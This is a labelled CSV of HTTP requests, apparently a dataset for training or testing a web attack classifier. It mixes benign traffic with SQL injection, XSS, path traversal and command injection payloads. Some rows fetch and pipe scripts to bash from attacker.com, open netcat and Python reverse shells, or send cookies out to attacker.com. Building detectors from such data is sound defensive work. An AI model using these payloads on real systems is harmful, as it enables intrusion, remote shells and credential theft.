request_text,label
"GET /static?file=..%c0%afetc%c0%afpasswd HTTP/1.1
Host: example.com",traversal
"GET /static?file=..%u2215etc%u2215passwd HTTP/1.1
Host: example.com",traversal
"GET /files/report.pdf HTTP/1.1
Host: example.com",benign
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' OR 1=1#&password=test",sqli
"GET /view?file=..%u2215etc%u2215passwd HTTP/1.1
Host: example.com",traversal
"GET /files/style.css HTTP/1.1
Host: example.com",benign
"POST /debug HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test`cat /etc/hosts`",cmdi
"GET /api/data?limit=61&offset=40&format=json HTTP/1.1
Host: example.com",benign
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<object data=javascript:alert(1)>&user=test",xss
"POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1; printenv",cmdi
"GET /search?q=gaming chair&page=8&sort=asc HTTP/1.1
Host: example.com",benign
"GET /api/data?limit=61&offset=377&format=json HTTP/1.1
Host: example.com",benign
"POST /admin/login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1 AND SLEEP(5)--&password=test",sqli
"POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=check&& env",cmdi
"POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test; ls -la",cmdi
"GET /api/execute?host=8.8.8.8| ls -la / HTTP/1.1
Host: example.com",cmdi
"GET /search?q=<select onchange=alert(1)><option>1</option></select> HTTP/1.1
Host: example.com",xss
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=charlie&password=SecureP@ss1",benign
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<script>alert(1)</script>&user=test",xss
"GET /debug?host=8.8.8.8| wget http://attacker.com/malware -O /tmp/m && chmod +x /tmp/m && /tmp/m HTTP/1.1
Host: example.com",cmdi
"GET /run?host=192.168.1.1| cat /etc/shadow HTTP/1.1
Host: example.com",cmdi
"PUT /api/users/grace HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""grace@email.com"",""name"":""Grace""}",benign
"GET /static?file=..\..\windows\system32 HTTP/1.1
Host: example.com",traversal
"PUT /api/users/john_doe HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""john_doe@email.com"",""name"":""John Doe""}",benign
"POST /checkout HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1 OR 1=1--&password=test",sqli
"GET /search?q=1; DROP TABLE users-- HTTP/1.1
Host: example.com",sqli
"GET /api/auth?q='; INSERT INTO users (username,password) VALUES ('hacked','hacked')-- HTTP/1.1
Host: example.com",sqli
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<audio src=x onerror=alert(1)>&user=test",xss
"GET /search?q=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)> HTTP/1.1
Host: example.com",xss
"GET /api/auth?q=' AND 1=BENCHMARK(5000000,MD5('a'))-- HTTP/1.1
Host: example.com",sqli
"GET /view?file=php://input HTTP/1.1
Host: example.com",traversal
"POST /user HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1' OR '1'='1'--&password=test",sqli
"GET /download?file=/proc/self/cmdline HTTP/1.1
Host: example.com",traversal
"GET /download?file=/var/log/auth.log HTTP/1.1
Host: example.com",traversal
"GET /view?file=..%u2215etc%u2215passwd HTTP/1.1
Host: example.com",traversal
"GET /product/brand_sony HTTP/1.1
Host: example.com
Accept: application/json",benign
"GET /api/execute?host=test`cat /etc/hosts` HTTP/1.1
Host: example.com",cmdi
"POST /tools HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=8.8.8.8$(cat /etc/group)",cmdi
"POST /tools HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test; nc -e /bin/sh attacker.com 4444",cmdi
"GET /view?file=%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /api/users/profile HTTP/1.1
Host: example.com
Authorization: Bearer bearer_987def",benign
"GET /view?file=..%c0%afetc%c0%afpasswd HTTP/1.1
Host: example.com",traversal
"GET /files?file=....//..//etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /tools?host=localhost; uname -a HTTP/1.1
Host: example.com",cmdi
"GET /comment?q='; alert(1); var x=' HTTP/1.1
Host: example.com",xss
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<body onload=alert(1)>&user=test",xss
"GET /contact HTTP/1.1
Host: example.com
Authorization: Bearer bearer_987def",benign
"POST /api/execute HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=localhost&& id",cmdi
"POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=8.8.8.8| id",cmdi
"GET /images?file=..\..\windows\system.ini HTTP/1.1
Host: example.com",traversal
"GET /login?q=' AND 1=BENCHMARK(5000000,MD5('a'))-- HTTP/1.1
Host: example.com",sqli
"GET /static?file=/var/log/auth.log HTTP/1.1
Host: example.com",traversal
"GET /static?file=../../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /user?q='; EXEC master..xp_cmdshell('dir')-- HTTP/1.1
Host: example.com",sqli
"DELETE /api/cart/item/744 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"GET /download?file=../../../etc/hosts HTTP/1.1
Host: example.com",traversal
"GET /search?q=laptop&page=2&sort=asc HTTP/1.1
Host: example.com",benign
"GET /view?file=../../../../var/www/html/.htpasswd HTTP/1.1
Host: example.com",traversal
"GET /admin/login?q=1 OR 1=1-- HTTP/1.1
Host: example.com",sqli
"POST /exec HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=check; cat /etc/passwd",cmdi
"GET /product?q=%27 OR %271%27=%271 HTTP/1.1
Host: example.com",sqli
"GET /files?file=../../../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /files/image.png HTTP/1.1
Host: example.com",benign
"GET /view?file=../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=diana&password=SecureP@ss1",benign
"GET /api/file?file=....//..//etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /exec?host=test; curl http://attacker.com/shell.sh | bash HTTP/1.1
Host: example.com",cmdi
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<audio src=x onerror=alert(1)>&user=test",xss
"GET /exec?host=192.168.1.1$(whoami) HTTP/1.1
Host: example.com",cmdi
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<script>document.location='http://attacker.com/?c='+document.cookie</script>&user=test",xss
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username='; EXEC master..xp_cmdshell('dir')--&password=test",sqli
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<script>new Image().src='http://attacker.com/?c='+document.cookie</script>&user=test",xss
"GET /api/file?file=/proc/self/cmdline HTTP/1.1
Host: example.com",traversal
"GET /view?file=%5c..%5c..%5cwindows%5csystem32 HTTP/1.1
Host: example.com",traversal
"GET /search?q=<svg/onload=alert(1)> HTTP/1.1
Host: example.com",xss
"GET /profile?q=<img src='x' onerror='alert(document.cookie)'> HTTP/1.1
Host: example.com",xss
"POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=check| ls -la /",cmdi
"GET /files?file=..%u2215etc%u2215passwd HTTP/1.1
Host: example.com",traversal
"GET /posts?q='; alert(1); var x=' HTTP/1.1
Host: example.com",xss
"PUT /api/users/bob HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""bob@email.com"",""name"":""Bob""}",benign
"GET /images?file=../../../../proc/self/environ HTTP/1.1
Host: example.com",traversal
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username='; DROP TABLE users; --&password=test",sqli
"POST /tools HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=8.8.8.8`id`",cmdi
"GET /feedback?q=<script>fetch('http://attacker.com/?c='+btoa(document.cookie))</script> HTTP/1.1
Host: example.com",xss
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1 AND SLEEP(5)--&password=test",sqli
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<script>alert('XSS')</script>&user=test",xss
"GET /posts?q=<div style='background:url(javascript:alert(1))'> HTTP/1.1
Host: example.com",xss
"GET /api/file?file=..%2Fetc%2Fpasswd HTTP/1.1
Host: example.com",traversal
"DELETE /api/cart/item/411 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"GET /images?file=/etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /search?q=' UNION SELECT null-- HTTP/1.1
Host: example.com",sqli
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<script>fetch('http://attacker.com/?c='+btoa(document.cookie))</script>&user=test",xss
"GET /profile?q=<object data=javascript:alert(1)> HTTP/1.1
Host: example.com",xss
"GET /static?file=%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /product?q=' AND 2>1-- HTTP/1.1
Host: example.com",sqli
"GET /images?file=php://input HTTP/1.1
Host: example.com",traversal
"POST /exec HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=8.8.8.8| cat /etc/shadow",cmdi
"GET /download?file=/var/log/auth.log HTTP/1.1
Host: example.com",traversal
"POST /admin/login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username='; INSERT INTO users (username,password) VALUES ('hacked','hacked')--&password=test",sqli
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=diana&password=SecureP@ss1",benign
"GET /run?host=test; ls -la HTTP/1.1
Host: example.com",cmdi
"PUT /api/users/eve HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""eve@email.com"",""name"":""Eve""}",benign
"GET /api/data?limit=24&offset=147&format=json HTTP/1.1
Host: example.com",benign
"POST /debug HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1`whoami`",cmdi
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=%3Cscript%3Ealert(1)%3C/script%3E&user=test",xss
"GET /download?file=....//etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /profile?q=<img src=x onerror=confirm(1)> HTTP/1.1
Host: example.com",xss
"GET /product?q=1' AND extractvalue(1,concat(0x7e,version()))-- HTTP/1.1
Host: example.com",sqli
"GET /comment?q=<audio src=x onerror=alert(1)> HTTP/1.1
Host: example.com",xss
"GET /search?q=gaming chair&page=5&sort=asc HTTP/1.1
Host: example.com",benign
"GET /api/auth?q=' OR 1=1-- HTTP/1.1
Host: example.com",sqli
"GET /api/file?file=../../../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /ping?host=check; nc -e /bin/sh attacker.com 4444 HTTP/1.1
Host: example.com",cmdi
"GET /tools?host=test&& python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""attacker.com"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])' HTTP/1.1
Host: example.com",cmdi
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' UNION SELECT null,null,null--&password=test",sqli
"POST /exec HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1$(whoami)",cmdi
"POST /api/execute HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test| type C:\Windows\System32\drivers\etc\hosts",cmdi
"GET /tools?host=check$(curl attacker.com/c2?h=$(hostname)) HTTP/1.1
Host: example.com",cmdi
"GET /api/data?limit=71&offset=250&format=json HTTP/1.1
Host: example.com",benign
"GET /files/document.docx HTTP/1.1
Host: example.com",benign
"POST /api/auth HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' OR '1'='1&password=test",sqli
"GET /api/users/profile HTTP/1.1
Host: example.com
Authorization: Bearer token_abc456",benign
"POST /api/execute HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=8.8.8.8| whoami",cmdi
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<svg onload=prompt(document.domain)>&user=test",xss
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<body onload=alert(1)>&user=test",xss
"GET /settings HTTP/1.1
Host: example.com
Authorization: Bearer token_abc456",benign
"GET /checkout?q=' HAVING 1=1-- HTTP/1.1
Host: example.com",sqli
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<img src=x onerror=prompt(1)>&user=test",xss
"GET /files?file=../etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /api/execute HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=check; nc -e /bin/sh attacker.com 4444",cmdi
"GET /ping?host=192.168.1.1; printenv HTTP/1.1
Host: example.com",cmdi
"GET /images?file=php://input HTTP/1.1
Host: example.com",traversal
"GET /download?file=../../../etc/hosts HTTP/1.1
Host: example.com",traversal
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<video src=x onerror=alert(1)>&user=test",xss
"GET /admin/login?q=admin' OR '1'='1' LIMIT 1-- HTTP/1.1
Host: example.com",sqli
"GET /view?file=../../../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /download?file=../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /search?q=%27 OR %271%27=%271 HTTP/1.1
Host: example.com",sqli
"GET /search?q=gaming chair&page=10&sort=asc HTTP/1.1
Host: example.com",benign
"DELETE /api/cart/item/116 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"POST /checkout HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=%27 OR %271%27=%271&password=test",sqli
"GET /view?file=php://input HTTP/1.1
Host: example.com",traversal
"DELETE /api/cart/item/980 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=frank&password=SecureP@ss1",benign
"GET /files?file=../../../../var/www/html/.htpasswd HTTP/1.1
Host: example.com",traversal
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=alice&password=SecureP@ss1",benign
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<a href=javascript:alert(1)>click me</a>&user=test",xss
"GET /home HTTP/1.1
Host: example.com
Authorization: Bearer key_xyz123",benign
"GET /product?q=1' OR '1'='1'-- HTTP/1.1
Host: example.com",sqli
"GET /static?file=../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /files/app.js HTTP/1.1
Host: example.com",benign
"GET /api/file?file=/etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /login?q=' UNION SELECT null-- HTTP/1.1
Host: example.com",sqli
"GET /search?q=<iframe onload=alert(1)> HTTP/1.1
Host: example.com",xss
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<style>body{background:url('javascript:alert(1)')}</style>&user=test",xss
"POST /tools HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test| ls -la /",cmdi
"GET /files?file=/etc/shadow HTTP/1.1
Host: example.com",traversal
"GET /files?file=%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /posts?q=<iframe onload=alert(1)> HTTP/1.1
Host: example.com",xss
"GET /debug?host=192.168.1.1&& id HTTP/1.1
Host: example.com",cmdi
"GET /api/file?file=..\..\windows\system32 HTTP/1.1
Host: example.com",traversal
"GET /feedback?q=<iframe onload=alert(1)> HTTP/1.1
Host: example.com",xss
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=OR 1=1--&password=test",sqli
"GET /api/data?limit=47&offset=30&format=json HTTP/1.1
Host: example.com",benign
"GET /files?file=/var/log/auth.log HTTP/1.1
Host: example.com",traversal
"GET /search?q=' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- HTTP/1.1
Host: example.com",sqli
"GET /product/cat_books HTTP/1.1
Host: example.com
Accept: application/json",benign
"GET /search?q=running shoes&page=9&sort=asc HTTP/1.1
Host: example.com",benign
"GET /user?q=1 AND SLEEP(5)-- HTTP/1.1
Host: example.com",sqli
"GET /images?file=../../../../etc/shadow HTTP/1.1
Host: example.com",traversal
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' AND SLEEP(5)--&password=test",sqli
"POST /api/auth HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' OR 'x'='x&password=test",sqli
"GET /files?file=file:///etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment='><script>alert(1)</script>&user=test",xss
"GET /images?file=/var/log/auth.log HTTP/1.1
Host: example.com",traversal
"GET /view?file=../../../etc/hosts HTTP/1.1
Host: example.com",traversal
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username='; EXEC xp_cmdshell('whoami')--&password=test",sqli
"GET /images?file=..%c1%9cetc%c1%9cpasswd HTTP/1.1
Host: example.com",traversal
"GET /wishlist HTTP/1.1
Host: example.com
Authorization: Bearer key_xyz123",benign
"DELETE /api/cart/item/753 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"GET /images?file=....//..//etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /debug HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=localhost; id",cmdi
"POST /api/auth HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' UNION SELECT username,password FROM users--&password=test",sqli
"POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=8.8.8.8| id",cmdi
"GET /view?file=../../../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1' OR '1'='1'--&password=test",sqli
"GET /files?file=../../../../proc/self/environ HTTP/1.1
Host: example.com",traversal
"GET /debug?host=8.8.8.8; cat /etc/passwd HTTP/1.1
Host: example.com",cmdi
"GET /search?q='; alert(1); var x=' HTTP/1.1
Host: example.com",xss
"GET /checkout?q=1 UNION SELECT version()-- HTTP/1.1
Host: example.com",sqli
"GET /search?q=1 UNION SELECT version()-- HTTP/1.1
Host: example.com",sqli
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin' OR '1'='1' LIMIT 1--&password=test",sqli
"GET /api/file?file=..%u2215etc%u2215passwd HTTP/1.1
Host: example.com",traversal
"GET /files/manual.pdf HTTP/1.1
Host: example.com",benign
"GET /static?file=../../../../etc/shadow HTTP/1.1
Host: example.com",traversal
"GET /tools?host=192.168.1.1&& ls /etc HTTP/1.1
Host: example.com",cmdi
"DELETE /api/cart/item/557 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"GET /view?file=..%252f..%252fetc%252fpasswd HTTP/1.1
Host: example.com",traversal
"GET /debug?host=192.168.1.1; whoami HTTP/1.1
Host: example.com",cmdi
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1' ORDER BY 1--&password=test",sqli
"PUT /api/users/judy HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""judy@email.com"",""name"":""Judy""}",benign
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=""><script>alert(1)</script>&user=test",xss
"DELETE /api/cart/item/963 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"GET /api/execute?host=test$(id) HTTP/1.1
Host: example.com",cmdi
"GET /about HTTP/1.1
Host: example.com
Authorization: Bearer key_xyz123",benign
"POST /checkout HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1' GROUP BY 1--&password=test",sqli
"POST /debug HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=localhost; whoami",cmdi
"POST /exec HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test| set",cmdi
"GET /images?file=../../../var/log/apache2/access.log HTTP/1.1
Host: example.com",traversal
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>&user=test",xss
"GET /api/execute?host=localhost; cat /etc/passwd HTTP/1.1
Host: example.com",cmdi
"GET /search?q=smartphone&page=10&sort=asc HTTP/1.1
Host: example.com",benign
"GET /comment?q=<details open ontoggle=alert(1)> HTTP/1.1
Host: example.com",xss
"GET /view?file=/var/log/auth.log HTTP/1.1
Host: example.com",traversal
"GET /posts?q=<script>document.location='http://attacker.com/?c='+document.cookie</script> HTTP/1.1
Host: example.com",xss
"PUT /api/users/alice HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""alice@email.com"",""name"":""Alice""}",benign
"GET /checkout?q=') OR ('1'='1 HTTP/1.1
Host: example.com",sqli
"POST /run HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test$(curl attacker.com/c2?h=$(hostname))",cmdi
"PUT /api/users/charlie HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""charlie@email.com"",""name"":""Charlie""}",benign
"POST /api/execute HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=check`cat /etc/hosts`",cmdi
"GET /api/file?file=%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /debug HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=8.8.8.8| set",cmdi
"POST /debug HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test&& python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""attacker.com"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",cmdi
"GET /wishlist HTTP/1.1
Host: example.com
Authorization: Bearer token_abc456",benign
"POST /run HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test| whoami",cmdi
"POST /user HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=%27 OR %271%27=%271&password=test",sqli
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1 UNION SELECT @@datadir--&password=test",sqli
"GET /view?file=../../../../var/www/html/.htpasswd HTTP/1.1
Host: example.com",traversal
"GET /api/file?file=../../../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /files/readme.txt HTTP/1.1
Host: example.com",benign
"GET /files/app.js HTTP/1.1
Host: example.com",benign
"GET /search?q=laptop&page=2&sort=asc HTTP/1.1
Host: example.com",benign
"GET /download?file=../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /feedback?q=<embed src=javascript:alert(1)> HTTP/1.1
Host: example.com",xss
"GET /wishlist HTTP/1.1
Host: example.com
Authorization: Bearer key_xyz123",benign
"GET /api/data?limit=10&offset=393&format=json HTTP/1.1
Host: example.com",benign
"GET /admin/login?q=1' AND extractvalue(1,concat(0x7e,version()))-- HTTP/1.1
Host: example.com",sqli
"GET /user?q=' OR 'x'='x HTTP/1.1
Host: example.com",sqli
"GET /view?file=..\..\windows\system.ini HTTP/1.1
Host: example.com",traversal
"GET /feedback?q='><script>alert(1)</script> HTTP/1.1
Host: example.com",xss
"GET /view?file=../../../etc/shadow HTTP/1.1
Host: example.com",traversal
"GET /ping?host=localhost`whoami` HTTP/1.1
Host: example.com",cmdi
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<style>body{background:url('javascript:alert(1)')}</style>&user=test",xss
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=bob&password=SecureP@ss1",benign
"GET /api/data?limit=27&offset=82&format=json HTTP/1.1
Host: example.com",benign
"GET /product/sale_items HTTP/1.1
Host: example.com
Accept: application/json",benign
"GET /search?q=wireless mouse&page=6&sort=asc HTTP/1.1
Host: example.com",benign
"GET /checkout?q=1; DROP TABLE users-- HTTP/1.1
Host: example.com",sqli
"POST /user HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1; DROP TABLE users--&password=test",sqli
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>&user=test",xss
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<details open ontoggle=alert(1)>&user=test",xss
"PUT /api/users/john_doe HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""john_doe@email.com"",""name"":""John Doe""}",benign
"DELETE /api/cart/item/93 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"GET /download?file=....//..//etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=&#60;script&#62;alert(1)&#60;/script&#62;&user=test",xss
"POST /user HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin'--&password=test",sqli
"GET /exec?host=8.8.8.8&& nmap -sV localhost HTTP/1.1
Host: example.com",cmdi
"GET /profile?q=<script>new Image().src='http://attacker.com/?c='+document.cookie</script> HTTP/1.1
Host: example.com",xss
"GET /view?file=/etc/shadow HTTP/1.1
Host: example.com",traversal
"GET /api/data?limit=16&offset=254&format=json HTTP/1.1
Host: example.com",benign
"GET /exec?host=test; ls -la HTTP/1.1
Host: example.com",cmdi
"GET /ping?host=localhost&& whoami HTTP/1.1
Host: example.com",cmdi
"GET /search?q=desk lamp&page=2&sort=asc HTTP/1.1
Host: example.com",benign
"GET /product/cat_electronics HTTP/1.1
Host: example.com
Accept: application/json",benign
"GET /tools?host=8.8.8.8; curl http://attacker.com/shell.sh | bash HTTP/1.1
Host: example.com",cmdi
"GET /api/file?file=..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: example.com",traversal
"GET /download?file=..\..\windows\system.ini HTTP/1.1
Host: example.com",traversal
"GET /search?q=coffee maker&page=6&sort=asc HTTP/1.1
Host: example.com",benign
"GET /ping?host=check&& env HTTP/1.1
Host: example.com",cmdi
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<video src=x onerror=alert(1)>&user=test",xss
"GET /posts?q=<img src=x onerror=confirm(1)> HTTP/1.1
Host: example.com",xss
"POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test; id",cmdi
"GET /search?q=<embed src=javascript:alert(1)> HTTP/1.1
Host: example.com",xss
"GET /files/invoice_2024.pdf HTTP/1.1
Host: example.com",benign
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>&user=test",xss
"GET /images?file=php://filter/convert.base64-encode/resource=/etc/passwd HTTP/1.1
Host: example.com",traversal
